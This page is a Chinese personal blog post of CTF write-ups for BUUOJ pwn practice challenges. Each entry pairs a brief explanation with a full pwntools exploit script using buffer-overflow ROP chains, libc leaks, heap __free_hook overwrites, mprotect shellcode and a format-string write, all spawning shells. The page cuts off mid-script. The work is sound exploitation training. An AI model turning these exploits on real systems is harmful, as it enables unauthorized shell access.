<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="chrome=1">

    

    <title>
      buu刷题 | starssgo的博客 
    </title>

    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    
      <meta name="author" content="John Doe">
    
    

    <meta name="description" content="test_your_nc连上就有flag rip64位，啥都没开，程序原本是想让我们覆盖返回地址跳转到system(&#x2F;bin&#x2F;sh)但是之后系统变成了Ubuntu.18，system(&#x2F;bin&#x2F;sh)打不过去了所以就困难了一点，泄露libc，利用execve(&amp;#39;bin&#x2F;sh&amp;#39;,0,0)打过去   1234567891011121314151617181920212223242526">
<meta name="keywords" content="Writeup">
<meta property="og:type" content="article">
<meta property="og:title" content="buu刷题 | starssgo的博客">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;19&#x2F;buu%E5%88%B7%E9%A2%98&#x2F;index.html">
<meta property="og:site_name" content="starssgo的博客">
<meta property="og:description" content="test_your_nc连上就有flag rip64位，啥都没开，程序原本是想让我们覆盖返回地址跳转到system(&#x2F;bin&#x2F;sh)但是之后系统变成了Ubuntu.18，system(&#x2F;bin&#x2F;sh)打不过去了所以就困难了一点，泄露libc，利用execve(&amp;#39;bin&#x2F;sh&amp;#39;,0,0)打过去   1234567891011121314151617181920212223242526">
<meta property="og:locale" content="en">
<meta property="og:updated_time" content="2019-12-20T13:06:38.357Z">
<meta name="twitter:card" content="summary">
    
    
    
      <link rel="icon" type="image/x-icon" href="/favicon.png">
    
    <link rel="stylesheet" href="/css/uno.css">
    <link rel="stylesheet" href="/css/highlight.css">
    <link rel="stylesheet" href="/css/archive.css">
    <link rel="stylesheet" href="/css/china-social-icon.css">

</head>
<body>

    <span class="mobile btn-mobile-menu">
        <i class="icon icon-list btn-mobile-menu__icon"></i>
        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

    

<header class="panel-cover panel-cover--collapsed">


  <div class="panel-main">

  
    <div class="panel-main__inner panel-inverted">
    <div class="panel-main__content">

        

        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">starssgo的博客</a></h1>
        <hr class="panel-cover__divider" />

        

        <div class="navigation-wrapper">

          <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">

              
                
                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
              
                
                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
              
                
                <li class="navigation__item"><a href="/archive" title="" class="">友链</a></li>
              

            </ul>
          </nav>

          <!-- ----------------------------
To add a new social icon simply duplicate one of the list items from below
and change the class in the <i> tag to match the desired social network
and then add your link to the <a>. Here is a full list of social network
classes that you can use:

    icon-social-500px
    icon-social-behance
    icon-social-delicious
    icon-social-designer-news
    icon-social-deviant-art
    icon-social-digg
    icon-social-dribbble
    icon-social-facebook
    icon-social-flickr
    icon-social-forrst
    icon-social-foursquare
    icon-social-github
    icon-social-google-plus
    icon-social-hi5
    icon-social-instagram
    icon-social-lastfm
    icon-social-linkedin
    icon-social-medium
    icon-social-myspace
    icon-social-path
    icon-social-pinterest
    icon-social-rdio
    icon-social-reddit
    icon-social-skype
    icon-social-spotify
    icon-social-stack-overflow
    icon-social-steam
    icon-social-stumbleupon
    icon-social-treehouse
    icon-social-tumblr
    icon-social-twitter
    icon-social-vimeo
    icon-social-xbox
    icon-social-yelp
    icon-social-youtube
    icon-social-zerply
    icon-mail

-------------------------------->

<!-- add social info here -->



        </div>

      </div>

    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>

    <div class="content-wrapper">
        <div class="content-wrapper__inner entry">
            

<article class="post-container post-container--single">

  <header class="post-header">
    
    <h1 class="post-title">buu刷题</h1>

    

    <div class="post-meta">
      <time datetime="2019-12-19" class="post-meta__date date">2019-12-19</time> 

      <span class="post-meta__tags tags">

          

          
             &#8226; 标签:
            <font class="tags">
              <a class="tags-link" href="/tags/Writeup/" rel="tag">Writeup</a>
            </font>
          

      </span>
    </div>
    
    

  </header>

  <section id="post-content" class="article-content post">
    <h3 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h3><p>连上就有flag</p>
<h3 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h3><p>64位，啥都没开，<br>程序原本是想让我们覆盖返回地址跳转到<code>system(/bin/sh)</code><br>但是之后系统变成了Ubuntu.18，<code>system(/bin/sh)</code>打不过去了<br>所以就困难了一点，泄露libc，利用<code>execve(&#39;bin/sh&#39;,0,0)</code>打过去  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line">p=process(&apos;./pwn1&apos;)</span><br><span class="line">#p=remote(&apos;node3.buuoj.cn&apos;,27902)</span><br><span class="line">elf=ELF(&apos;./pwn1&apos;)</span><br><span class="line">pop_rdi_ret=0x004011fb</span><br><span class="line">pop_rsi_r15_ret=0x04011f9</span><br><span class="line">main_addr=0x0401142</span><br><span class="line">__libc_start_main=elf.got[&apos;__libc_start_main&apos;]</span><br><span class="line">puts_plt=elf.plt[&apos;puts&apos;]</span><br><span class="line">p.recvuntil(&apos;please input\n&apos;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">payload=&apos;A&apos;*23+p64(pop_rdi_ret)+p64(__libc_start_main)+p64(puts_plt)+p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;ok,bye!!!\n&apos;)</span><br><span class="line">__libc_start_addr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc=LibcSearcher(&apos;__libc_start_main&apos;,__libc_start_addr)</span><br><span class="line">libcdata_addr=__libc_start_addr-libc.dump(&apos;__libc_start_main&apos;)</span><br><span class="line">execve_addr=libcdata_addr+libc.dump(&apos;execve&apos;)</span><br><span class="line">binsh_addr=libcdata_addr+libc.dump(&apos;str_bin_sh&apos;)</span><br><span class="line">print &quot;libcdata_addr=&gt;&quot;,hex(libcdata_addr)</span><br><span class="line">p.recvuntil(&apos;please input\n&apos;)</span><br><span class="line">payload=&apos;A&apos;*23+p64(pop_rdi_ret)+p64(binsh_addr)+p64(pop_rsi_r15_ret)+p64(0)+p64(0)+p64(execve_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><p>程序中给了system(/bin/sh),覆盖返回地址改跳转就行  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p=process(&apos;./warmup_csaw_2016&apos;)</span><br><span class="line">p=remote(&apos;node3.buuoj.cn&apos;,28168)</span><br><span class="line">payload=&apos;A&apos;*72+p64(0x40060d)</span><br><span class="line">p.sendlineafter(&apos;&gt;&apos;,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h3><p>C++，程序会将输入的I变成you，造成溢出  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p=process(&apos;./pwn1_sctf_2016&apos;)</span><br><span class="line">p=remote(&apos;node3.buuoj.cn&apos;,26705)</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;I&apos;*21+&apos;a&apos;+p32(0x8048F0D))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h3><p><code>gets()</code>栈溢出泄露地址，然后<code>getshell</code><br>中间吧gets()的输入加密了，直接<code>\x00</code>来规避strlen()监测  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">#context.log_level=&quot;debug&quot;</span><br><span class="line">#p=process(&apos;./ciscn&apos;)</span><br><span class="line">p=remote(&apos;buuoj.cn&apos;,25206)</span><br><span class="line">elf=ELF(&apos;./ciscn&apos;)</span><br><span class="line">puts_plt=elf.plt[&apos;puts&apos;]</span><br><span class="line">__libc_start_main=elf.got[&apos;__libc_start_main&apos;]</span><br><span class="line"></span><br><span class="line">main_addr=0x00400B28</span><br><span class="line">pop_rdi_ret=0x00400c83</span><br><span class="line">pop_rsi_r15_ret=0x0400c81</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Input your choice!\n&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">payload=&apos;\x00&apos;+&apos;A&apos;*0x4f+p64(0)+p64(pop_rdi_ret)+p64(__libc_start_main)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">p.recvuntil(&apos;Input your Plaintext to be encrypted\n&apos;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">__libc_start_addr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc=LibcSearcher(&apos;__libc_start_main&apos;,__libc_start_addr)</span><br><span class="line">libcbase_addr=__libc_start_addr-libc.dump(&apos;__libc_start_main&apos;)</span><br><span class="line">execve_addr=libcbase_addr+libc.dump(&apos;execve&apos;)</span><br><span class="line">binsh_addr=libcbase_addr+libc.dump(&apos;str_bin_sh&apos;)</span><br><span class="line">print &quot;libcbase_addr=&gt;&quot;,hex(libcbase_addr)</span><br><span class="line">p.recvuntil(&apos;Input your choice!\n&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">payload=&apos;\x00&apos;+&apos;A&apos;*0x4f+p64(0)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(pop_rsi_r15_ret)+p64(0)+p64(0)+p64(execve_addr)+p64(main_addr)</span><br><span class="line">p.recvuntil(&apos;Input your Plaintext to be encrypted\n&apos;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><p>覆盖个浮点数<br>想无赖点写个C语言看看栈</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">elf = ELF(&apos;n_ciscn&apos;)</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		p = process(&apos;./n_ciscn&apos;)</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		p = remote(ip,port)</span><br><span class="line">	p.recvuntil(&quot;Let&apos;s guess the number.\n&quot;)</span><br><span class="line">	gdb.attach(p)	</span><br><span class="line">	p.sendline(&apos;A&apos;*(0x30-4)+p32(0x41348000))</span><br><span class="line">	</span><br><span class="line">	p.interactive()</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	pwn(&apos;buuoj.cn&apos;,20035,1)</span><br></pre></td></tr></table></figure>
<h3 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">p=process(&apos;./pwn&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./pwn&apos;)</span><br><span class="line">puts_plt=elf.plt[&apos;puts&apos;]</span><br><span class="line">__libc_start_main=elf.got[&apos;__libc_start_main&apos;]</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;\x00&apos;*7+&apos;\xff&apos;)</span><br><span class="line">main_addr=0x08048825</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Correct\n&apos;)</span><br><span class="line">payload=&apos;A&apos;*0xE7+p32(0)+p32(puts_plt)+p32(main_addr)+p32(__libc_start_main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">__libc_start_addr=u32(p.recv(4))</span><br><span class="line">print &quot;__libc_start_addr=&gt;&quot;,hex(__libc_start_addr)</span><br><span class="line">libc=LibcSearcher(&quot;__libc_start_main&quot;,__libc_start_addr)</span><br><span class="line">libcdata_addr=__libc_start_addr-libc.dump(&apos;__libc_start_main&apos;)</span><br><span class="line">system_addr=libcdata_addr+libc.dump(&apos;system&apos;)</span><br><span class="line">binsh_addr=libcdata_addr+libc.dump(&apos;str_bin_sh&apos;)</span><br><span class="line">p.sendline(&apos;\x00&apos;*7+&apos;\xff&apos;)</span><br><span class="line">p.recvuntil(&apos;Correct\n&apos;)</span><br><span class="line">payload=&apos;A&apos;*0xE7+p32(0)+p32(system_addr)+p32(main_addr)+p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h3><p>单字节溢出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">p=process(&apos;./babyheap&apos;)</span><br><span class="line">#p=remote(&apos;node3.buuoj.cn&apos;,25895)</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line">def Allocate(Size):</span><br><span class="line">	p.sendlineafter(&apos;Command: &apos;,&apos;1&apos;)</span><br><span class="line">	p.sendlineafter(&apos;Size: &apos;,str(Size))</span><br><span class="line">def Fill(Index,Size,context):</span><br><span class="line">	p.sendlineafter(&apos;Command: &apos;,&apos;2&apos;)</span><br><span class="line">	p.sendlineafter(&apos;Index: &apos;,str(Index))</span><br><span class="line">	p.sendlineafter(&apos;Size: &apos;,str(Size))</span><br><span class="line">	p.sendafter(&apos;Content: &apos;,context)</span><br><span class="line">def Free(Index):</span><br><span class="line">	p.sendlineafter(&apos;Command: &apos;,&apos;3&apos;)</span><br><span class="line">	p.sendlineafter(&apos;Index: &apos;,str(Index))</span><br><span class="line">def Dump(Index):</span><br><span class="line">	p.sendlineafter(&apos;Command: &apos;,&apos;4&apos;)</span><br><span class="line">	p.sendlineafter(&apos;Index: &apos;,str(Index))</span><br><span class="line">Allocate(0x10)#</span><br><span class="line">Allocate(0x10)</span><br><span class="line">Allocate(0x10)</span><br><span class="line">Allocate(0x10)</span><br><span class="line">Allocate(0x80)</span><br><span class="line">Allocate(0x10)</span><br><span class="line">Allocate(0x68)</span><br><span class="line">Free(2)</span><br><span class="line">Free(1)</span><br><span class="line"></span><br><span class="line">payload=p64(0)*3+p64(0x21)+&apos;\x80&apos;</span><br><span class="line">Fill(0,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload=p64(0)*3+p64(0x21)</span><br><span class="line">Fill(3,len(payload),payload)</span><br><span class="line"></span><br><span class="line">Allocate(0x10)#1</span><br><span class="line">Allocate(0x10)#2</span><br><span class="line"></span><br><span class="line">payload= p64(0)*3+p64(0x91)</span><br><span class="line">Fill(3,len(payload),payload)</span><br><span class="line">Allocate(0x80)</span><br><span class="line">Free(4)</span><br><span class="line">Dump(2)</span><br><span class="line">p.recvline()</span><br><span class="line">libc_start_main=u64(p.recv(6).ljust(8,&apos;\x00&apos;))-(0x7f409c186b78-0x7f409bde2740)</span><br><span class="line">print &apos;libc_start_main=&gt;&apos;,hex(libc_start_main)</span><br><span class="line">libc=LibcSearcher(&apos;__libc_start_main&apos;,libc_start_main)</span><br><span class="line">libcbase_addr=libc_start_main-libc.dump(&apos;__libc_start_main&apos;)</span><br><span class="line">print &apos;libcbase_addr=&gt;&apos;,hex(libcbase_addr)</span><br><span class="line">free_hook_addr=libcbase_addr+libc.dump(&apos;__free_hook&apos;)</span><br><span class="line">system_addr=libcbase_addr+libc.dump(&apos;system&apos;)</span><br><span class="line">print &quot;free_hook_addr=&gt;&quot;,hex(free_hook_addr)</span><br><span class="line">payload= p64(0)*3+p64(0x91)+p64(0)+p64(free_hook_addr-0x40)</span><br><span class="line">Fill(3,len(payload),payload)</span><br><span class="line">Allocate(0x80)</span><br><span class="line">Free(6)</span><br><span class="line">payload=p64(0)*3+p64(0x71)+p64(free_hook_addr-0x33)</span><br><span class="line">Fill(5,len(payload),payload)</span><br><span class="line">Allocate(0x68)#6</span><br><span class="line">Allocate(0x68)#8</span><br><span class="line">payload=&apos;\x00&apos;*35+p64(system_addr)</span><br><span class="line">Fill(8,len(payload),payload)</span><br><span class="line">Fill(7,8,&apos;/bin/sh\x00&apos;)</span><br><span class="line">Free(7)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h3><p>静态编译，以为是个简单的，其实要用mprotect来更改权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.arch = &quot;i386&quot;</span><br><span class="line">#context.log_level=&apos;debug&apos;</span><br><span class="line">p=remote(&apos;node3.buuoj.cn&apos;,27708)</span><br><span class="line">#p=process(&apos;./get_sta&apos;)</span><br><span class="line">elf=ELF(&apos;get_sta&apos;)</span><br><span class="line">#mprotect_plt=elf.plt[&apos;mprotect&apos;]</span><br><span class="line">#read_plt=elf.plt[&apos;read&apos;]</span><br><span class="line">pop_3_ret=0x0804f460</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">payload=&apos;A&apos;*56+p32(0x806EC80)+p32(pop_3_ret)+p32(0x080EB000)+p32(0x1000)+p32(7)+p32(0x806E14A)+p32(0x080EB000)+p32(1)+p32(0x080EB000)+p32(0x100)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h3><p>格式化字符串改个值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p=remote(&apos;node3.buuoj.cn&apos;,28966)</span><br><span class="line">p=process(&apos;./pwn&apos;)</span><br><span class="line">payload=&apos;%14$hn%15$hn&apos;.ljust(16,&apos;A&apos;)+p32(0x804C044)+p32(0x804C046)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendlineafter(&apos;your name:&apos;,payload)</span><br><span class="line">payload=p32(0x00040004)+p32(0)</span><br><span class="line">p.sendlineafter(&apos;your passwd:&apos;,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h3><p>写32位shellcode  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">context.arch = &quot;i386&quot;</span><br><span class="line">#p=remote(&apos;node3.buuoj.cn&apos;,26098)</span><br><span class="line">p=process(&apos;./not_3dsctf_2016&apos;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">pop3_ret=0x0804f420</span><br><span class="line">mprotect=0x806ED40</span><br><span class="line">payload = &apos;a&apos;*45+p32(mprotect)+p32(pop3_ret)+p32(0x80EB000)+p32(0x1000)+p32(7)+p32(0x806E200)+p32(0x80EB000)+p32(0)+p32(0x80EB000)+p32(0x100)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h3><p>动调下吧 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p=process(&apos;./ciscn&apos;)</span><br><span class="line">p=remote(&apos;node3.buuoj.cn&apos;,25006)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recvuntil(&quot;What&apos;s your name?\n&quot;)</span><br><span class="line">payload=&apos;A&apos;*0x34+p32(0x11)+p32(0)+&quot;C&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h3><p>32位堆 ，改写<code>free-&gt;system</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">#context.log_level=&quot;debug&quot;</span><br><span class="line">p=process(&apos;./babyfengshui&apos;)</span><br><span class="line">#p=remote(&apos;node3.buuoj.cn&apos;,29500)</span><br><span class="line">elf=ELF(&apos;./babyfengshui&apos;)</span><br><span class="line">free_got=elf.got[&apos;free&apos;]</span><br><span class="line">def Allocate(descrip,name,length,text):</span><br><span class="line">	p.sendlineafter(&apos;Action: &apos;,&apos;0&apos;)</span><br><span class="line">	p.sendlineafter(&apos;size of description: &apos;,str(descrip))</span><br><span class="line">	p.sendlineafter(&apos;name: &apos;,name)</span><br><span class="line">	p.sendlineafter(&apos;text length: &apos;,str(length))</span><br><span class="line">	p.recvuntil(&apos;text: &apos;)</span><br><span class="line">	p.sendline(text)</span><br><span class="line">def Update(Index,length,text):</span><br><span class="line">	p.sendlineafter(&apos;Action: &apos;,&apos;3&apos;)</span><br><span class="line">	p.sendlineafter(&apos;index: &apos;,str(Index))</span><br><span class="line">	p.sendlineafter(&apos;text length: &apos;,str(length))</span><br><span class="line">	p.sendafter(&apos;text: 